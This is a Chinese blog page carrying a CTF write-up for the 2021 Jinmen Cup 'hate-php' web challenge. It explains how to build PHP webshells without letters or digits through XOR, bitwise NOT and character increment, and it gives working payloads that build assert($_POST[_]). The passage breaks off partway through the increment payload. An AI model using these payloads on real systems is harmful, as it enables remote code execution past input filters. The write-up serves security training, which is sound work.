@@ -1,0 +1,452 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>2021-第五届世界智能大会-「津门杯」国际网络安全创新大赛-Web-hate-php | 慕星aaaaa</title><meta name="author" content="小师弟"><meta name="copyright" content="小师弟"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="启动靶场环境，显示了网页源代码； 1234567891011&lt;?phperror_reporting(0);if(!isset($_GET[&amp;#x27;code&amp;#x27;])) &amp;#123;    highlight_file(__FILE__);&amp;#125; else &amp;#123;    $code &#x3D; $_GET[&amp;#x27;code&amp;#x27;];    if(preg_match(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021-第五届世界智能大会-「津门杯」国际网络安全创新大赛-Web-hate-php">
+<meta property="og:url" content="http://example.com/posts/7ed34c14.html">
+<meta property="og:site_name" content="慕星aaaaa">
+<meta property="og:description" content="启动靶场环境，显示了网页源代码； 1234567891011&lt;?phperror_reporting(0);if(!isset($_GET[&amp;#x27;code&amp;#x27;])) &amp;#123;    highlight_file(__FILE__);&amp;#125; else &amp;#123;    $code &#x3D; $_GET[&amp;#x27;code&amp;#x27;];    if(preg_match(">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2023-03-30T12:01:02.000Z">
+<meta property="article:modified_time" content="2023-03-30T12:03:31.258Z">
+<meta property="article:author" content="小师弟">
+<meta property="article:tag" content="命令执行">
+<meta property="article:tag" content="webshell">
+<meta property="article:tag" content="小技巧">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/posts/7ed34c14.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="manifest" href="/manifest.json"/><meta name="msapplication-TileColor" content="#3b70fc"/><link rel="apple-touch-icon" sizes="180x180" href="/img/siteicon/128.png"/><link rel="icon" type="image/png" sizes="32x32" href="/img/siteicon/32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/img/siteicon/16.png"/><link rel="mask-icon" href="/img/siteicon/128.png" color="#5bbad5"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2021-第五届世界智能大会-「津门杯」国际网络安全创新大赛-Web-hate-php',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-30 12:03:31'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="慕星aaaaa" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="慕星aaaaa"><span class="site-name">慕星aaaaa</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2021-第五届世界智能大会-「津门杯」国际网络安全创新大赛-Web-hate-php</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-30T12:01:02.000Z" title="发表于 2023-03-30 12:01:02">2023-03-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-30T12:03:31.258Z" title="更新于 2023-03-30 12:03:31">2023-03-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2021-第五届世界智能大会-「津门杯」国际网络安全创新大赛-Web-hate-php"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>启动靶场环境，显示了网页源代码；</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,<span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;fighting!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在代码中，通过正则匹配，过滤了大小写字母、数字、以及<code>_$@</code>等字符；</p>
+<p>需要构建一个不包含数字、字母以及特殊字符的webshell；</p>
+<p>可以参考以下的两篇文章，介绍了无字母、数字的webshell；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</span><br><span class="line">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="无字母数字webshell"><a href="#无字母数字webshell" class="headerlink" title="无字母数字webshell"></a>无字母数字webshell</h3><p>首先看如何绕过字母和数字限制，过滤代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;fighting!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首要思路是，将非字母、数字的字符经过变换之后，能够构造出<code>a-z</code>中的任意字符，在利用PHP允许动态函数执行的特点，拼接出函数名，如<code>assert</code>，然后动态执行即可。</p>
+<p>在<code>PHP5</code>中，<code>assert</code>是一个函数，可以通过<code>$f=&#39;assert&#39;;$f(xxx);</code>的方式来动态执行任意代码。</p>
+<p>在<code>PHP7</code>中，<code>assert</code>是一个语言结构（类似于<code>eval</code>），不能在作为函数名动态执行代码；可以利用<code>file_put_contents</code>函数，来进行getshell。</p>
+<h4 id="方式一：异或"><a href="#方式一：异或" class="headerlink" title="方式一：异或"></a>方式一：异或</h4><p>如下代码，通过字符异或的方式，构造出webshell。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); <span class="comment">// $_=&#x27;assert&#x27;;</span></span><br><span class="line">        <span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); <span class="comment">// $__=&#x27;_POST&#x27;;</span></span><br><span class="line">        <span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line">        <span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">// assert($_POST[_]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>URL编码或可显示字符</th>
+<th>ASCII编码</th>
+<th>二进制</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>%01</td>
+<td>1</td>
+<td>00000001</td>
+</tr>
+<tr>
+<td>&#96;</td>
+<td>96</td>
+<td>01100000</td>
+</tr>
+<tr>
+<td>a</td>
+<td>97</td>
+<td>01100001</td>
+</tr>
+<tr>
+<td>%13</td>
+<td>19</td>
+<td>00010011</td>
+</tr>
+<tr>
+<td>&#96;</td>
+<td>96</td>
+<td>01100000</td>
+</tr>
+<tr>
+<td>s</td>
+<td>115</td>
+<td>01110011</td>
+</tr>
+</tbody></table>
+<p>通过上面对非字母、数字的字符进行异或操作，可以拼接出<code>assert($_POST[_]);</code>，即构造出无字母数字的webshell，执行PHP代码；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;);$___=$$__;$_($___[_]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/web-hate-php/image-20230215111406835.png" alt="image-20230215111406835"></p>
+<h4 id="方式二：取反"><a href="#方式二：取反" class="headerlink" title="方式二：取反"></a>方式二：取反</h4><p>利用<code>UTF-8</code>编码后的汉字，取出其中的某个字符，然后再进行取反操作；</p>
+<p>例如汉字<code>和</code>的<code>UTF-8</code>编码为<code>&amp;#x548C;</code>，第二个字节的字符为<code>\x8c</code>，其二进制编码为<code>10001100</code>，对其取反后的二进制为<code>01110011</code>，即字符<code>s</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$_</span>=<span class="string">&quot;和&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> ~(<span class="variable">$_</span>&#123;<span class="number">2</span>&#125;).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>要想获得第二个字节字符，就必须包含数字2；由于PHP弱类型的特性，其<code>True</code>值为<code>1</code>，因此<code>True+True=2</code>，可利用<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)</code>的值为<code>2</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$__</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$_</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用上述方式，构造如下的payload；</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);        <span class="comment">// $__ = &#x27;2&#x27;</span></span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;             <span class="comment">// $_ = &#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$____</span>=<span class="string">&#x27;&#x27;</span>;       <span class="comment">// 定义空的拼接字符</span></span><br><span class="line">        <span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;的&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;半&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;始&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);</span><br><span class="line">        <span class="comment">// $____ = &#x27;assert&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$_____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$___</span>=<span class="string">&quot;俯&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;次&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;站&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);</span><br><span class="line">        <span class="comment">// $_____ = &#x27;_POST&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$$_____</span>;             <span class="comment">// $_ = &#x27;$_POST&#x27;</span></span><br><span class="line">        <span class="variable">$____</span>(<span class="variable">$_</span>[__]);          <span class="comment">// assert($_POST[__])</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$__=(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;)+(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;);$_=$__/$__;$____=&#x27;&#x27;;$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);$_____=&#x27;_&#x27;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[__]);</span><br></pre></td></tr></table></figure>
+
+<p>对上述的payload进行URL编码，即可成功执行；</p>
+<p><img src="/web-hate-php/image-20230223150443380.png" alt="image-20230223150443380"></p>
+<h4 id="方式三：自增"><a href="#方式三：自增" class="headerlink" title="方式三：自增"></a>方式三：自增</h4><p>根据PHP官方文档，PHP在处理字符变量的算数运算时，沿用了Perl的习惯，即<code>&#39;a&#39;++ &gt; &#39;b&#39;</code>、<code>&#39;b&#39;++ &gt; &#39;c&#39;</code>，只要能获取到大小写字母<code>Aa</code>，可以通过自增操作获得所有的大小写字母。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.php.net/manual/zh/language.operators.increment.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/web-hate-php/image-20230223151600634.png" alt="image-20230223151600634"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$_</span>=<span class="string">&quot;a&quot;</span>;</span><br><span class="line">        <span class="variable">$_</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$_</span>;</span><br><span class="line">        <span class="variable">$_</span>++;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$_</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在PHP中，数组（Array）的首字母是大写字母<code>A</code>，第四个字母是小写字母<code>a</code>，能够同时获取到大小写字母<code>Aa</code>；</p>
+<p>在PHP中，如果强制连接数组和字符串，数组将被强制转换成字符串，其值为<code>Array</code>；</p>
+<p>PS：对PHP版本有要求，低版本的PHP不好使；使用的PHP版本为5.6.9；</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$_</span>=[];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>.<span class="variable">$_</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用上述方法，构造payload；</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];   $_=&#x27;A&#x27;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span 